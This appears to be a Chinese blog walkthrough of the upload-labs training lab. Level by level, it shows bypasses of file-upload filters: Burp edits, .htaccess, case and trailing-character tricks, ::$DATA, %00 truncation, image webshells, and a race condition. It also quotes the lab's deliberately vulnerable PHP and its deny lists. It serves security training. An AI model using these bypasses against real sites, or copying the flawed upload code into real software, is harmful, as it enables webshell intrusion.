---
layout:     post
title:      upload-labs合集
subtitle:   文件上传漏洞
date:       2020-11-09
author:     heria
header-img: img/post-bg-miui6.jpg
catalog: true
tags:
---



## 0X01upload-labs环境搭建

linux下使用docker搭建

```
docker pull c0ny1/upload-labs
```

![img](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/20190804145816.png)

创建容器
`docker run -d -p 8080:80 c0ny1/upload-labs:latest`

![img](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/20190804150235.png)

访问8080端口

![image-20201109111713538](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109111713538.png)

考点

![image-20201110113940263](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110113940263.png)

![image-20201110114000103](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110114000103.png)

## 0X02Pass-01

![image-20201109111815247](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109111815247.png)



普通jpg文件可上传![image-20201109111858404](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109111858404.png)

上传php webshell 提示不允许上传

![image-20201109111918602](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109111918602.png)

1.前端绕过

删除return checkFile

![image-20201109112047471](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109112047471.png)

或者checkFile添加php后缀

![image-20201109112109396](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109112109396.png)

chrome无法更改，更换owasp firefox浏览器

![image-20201109112317970](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109112317970.png)

绕过成功 蚁剑连接

![image-20201109112420802](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109112420802.png)

![image-20201109112430258](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109112430258.png)

2.burp抓包修改

php后缀webshell改名为jpg后缀，上传抓包，改回php后缀

![image-20201109113127882](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109113127882.png)

上传成功

![image-20201109113245179](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109113245179.png)

代码

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

## 0X03Pass-02

burp抓包修改

1.php后缀webshell改名为jpg后缀，上传抓包，改回php后缀

![image-20201109113749039](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109113749039.png)

成功绕过上传

2.直接上传php后缀文件，更改content-type

![image-20201109130857839](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109130857839.png)

代码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

## 0X04Pass-03

先前方法并不能绕过上传

![image-20201109132003745](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109132003745.png)

更改后缀名.php3 成功绕过，文件名被修改，但无法解析

![image-20201109132658151](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109132658151.png)

![image-20201109132331294](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109132331294.png)代码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

## 0X05Pass-04

提示无法上传如下后缀文件

![image-20201109134110185](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109134110185.png)

上传.htaccess文件内容如下

![image-20201109134200931](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109134200931.png)

![image-20201109135126787](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109135126787.png)

当匹配到test字符串时会以php解析，上传test.jpg文件

![image-20201109134412585](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109134412585.png)

蚁剑连接

![image-20201109135304482](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109135304482.png)

![image-20201109135322656](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109135322656.png)

代码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

## 0X06Pass-05

提示 无法上传htaccess文件

![image-20201109135448593](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109135448593.png)

代码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

查看代码，无大小写替换，后缀大小写混用绕过

![image-20201109141001598](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109141001598.png)

成功绕过，但无法解析

![image-20201109141315875](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109141315875.png)

## 0X07Pass-06

查看提示

![image-20201109141444752](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109141444752.png)

尝试大小写失败

![image-20201109141644978](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109141644978.png)



查看源码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

少了

```text
$file_ext = trim($file_ext); //首尾去空
```

在文件名后添加空格绕过，windows系统的命名规则，windows在创建文件时会删除后缀名后的.和空格，并且后缀名为php.的文件也是可以当作php解析的

![image-20201109142251720](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109142251720.png)

linux失败（能绕过创建文件，但是访问出错）

![image-20201109142539254](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109142539254.png)

## 0X08Pass-07

![image-20201109142711455](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109142711455.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

审查代码发现通过上传后缀名“php.”绕过

![image-20201109143129199](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109143129199.png)

linux环境下无法解析 

![image-20201109143232048](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109143232048.png)

## 0X09Pass-08



![image-20201109143823547](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109143823547.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

 缺少

```
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
```

利用的是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 ![DATA。当我们访问 a.asp::](https://math.jianshu.com/math?formula=DATA%E3%80%82%E5%BD%93%E6%88%91%E4%BB%AC%E8%AE%BF%E9%97%AE%20a.asp%3A%3A)DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。

![image-20201109144046093](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109144046093.png)

linux 无法解析

![image-20201109144134287](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109144134287.png)

## 0X0APass-09

![image-20201109144510583](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109144510583.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

发现这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。所以我们构造点空格点进行绕过，把后缀名改为.php.  .，也是利用了Windows的特性

![image-20201109144847782](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109144847782.png)

![image-20201109145003422](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109145003422.png)

成功绕过，linux 无法解析

![image-20201109144953097](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109144953097.png)

## 0X0BPass-10

![image-20201109145327785](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109145327785.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

双写绕过

```
$file_name = str_ireplace($deny_ext,"", $file_name);
```

![image-20201109145552016](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109145552016.png)

## 0X0CPass-11

![image-20201109145734904](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109145734904.png)

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

strrpos() 定义和用法

 strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。 

注释：strrpos() 函数对大小写敏感。

例：

<?php $a = '1.jpg'; $file_ext = substr($a,strrpos($a,".")+1); var_dump($file_ext); ?> 返回jpg

分析代码：

```
$img_path = $_GET['save_path']."/".rand(10,99).date("YmdHis").".".$file_ext;
12
```

发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过。但是发现怎么截断都没有用。查阅资料：

```
截断条件：
    php版本小于5.3.4 详情关注CVE-2006-7243
    php的magic_quotes_gpc为OFF状态
```

在url中`%00`表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片

可以通过一个例子详解的了解一下

```
<% 
path="upload/web/" 
file="1.jpg" 
upfilename=path & file '最后的上传地址 
%>
```

将路径改为`path="upload/web/1.php%00"`,那么拼接之后，文件上传时就变成了
`"upload/web/1.php%001.jpg"`，这时上传便将`1.php`上传进去，而`1.jpg`则被截断，我理解的就是相对于省略符号，将后面的内容给省略了，相当于MySQL注入语句中的`#`、`--+`等

![image-20201109151027149](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109151027149.png)

## 0X0DPass-12

![image-20201109151133690](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109151133690.png)

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

断

但是这次不能直接抓包在后面加上`%00`，因为post不会像get一样对`%00`进行自动解码，所以得换另一种方法进行`%00`绕过，

![image-20201109151630973](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109151630973.png)

![image-20201109151812559](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109151812559.png)

%00截断失败



## 0X0EPass-13

![image-20201109152212083](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109152212083.png)

制作图片马

```
copy 1.jpg /b + 1.php /a shell.jpg
```

![image-20201109152417893](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109152417893.png)



配合文件包含漏洞

![image-20201109152906422](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109152906422.png)

![image-20201109152742448](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109152742448.png)

蚁剑连接

分析一下源码

```
function getReailFileType($filename){
    $file = fopen($filename, "rb");//fopen() 函数打开文件或者 URL，"r" 	只读方式打开，将文件指针指向文件头
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

可以看出做出限制的是这一段代码

```
$bin = fread($file, 2); //只读2字节
```

通过读文件的前2个字节判断文件类型,没有其他防护，所以可以上传图片马解析即可

## 0X0FPass-14

![image-20201109153140959](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109153140959.png)

分析一下源码

```
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);//getimagesize() 函数用于获取图像大小及相关信息
        $ext = image_type_to_extension($info[2]);//image_type_to_extension — 根据指定的图像类型返回对应的后缀名。
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

进行限制的是这两段代码

```
$info = getimagesize($filename);
$ext = image_type_to_extension($info[2]);
```

通过使用`getimagesize()`检查是否为图片文件，所以还是可以用第十三关的图片马绕过

## 0X10Pass-15

查看一下源码

```
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

做出限制的代码为：

```
$image_type = exif_imagetype($filename);
```

`exif_imagetype`函数获取图片类型，使用`exif_imagetype()`检查是否为图片文件
，所以还是可以用前两关的方法

## 0X11Pass-16

https://xz.aliyun.com/t/2657#toc-2

imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了

![image-20201109154029614](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109154029614.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagejpeg($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagepng($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagegif($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。但是这一关的代码有一个明显的逻辑漏洞，如果这几个二次渲染函数处理的不是一个图片，就会使这几个函数报错，因为这几个二次渲染的函数只会去处理一个图片内部格式正确的图片，所以在这里只需要上传一个后缀名为jpg、png、gif的一句话木马，这样的话上传的一句话木马会绕过后缀名和MIME类型的检查，通过move_uploaded_file上传至服务器，但是遇到二次渲染时，由于上传的不是一个真正的图片，所以二次渲染函数在处理时会因为图片的内部格式报错，从而突破了对图片的二次渲染，这时候页面虽然会显示图片格式不允许，但是上传的一句话木马已经上传到了服务器(实际测试失败)

绕过方法

改gif的简单 上传一个gif图片
下载后用winhex对比 视图 同步比较
在没有变化的地方添加 一句话木马
上传即成功



## 0X12Pass-17

![image-20201109160959824](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109160959824.png)



```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

```
if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
```

这一段代码先将文件上传到服务器，再判断后缀名，如果合法则保留下来，如果不合法，后面这段代码则起删除作用，删除在服务器的文件

```
$msg = "只允许上传.jpg|.png|.gif类型文件！";
           unlink($upload_file);
```

`unlink()` 函数删除文件

可以通过**条件竞争的方式**在unlink()函数删除之前，访问上传文件，在此之前先来了解一下**条件竞争**

> 条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

burp通过intruder重放

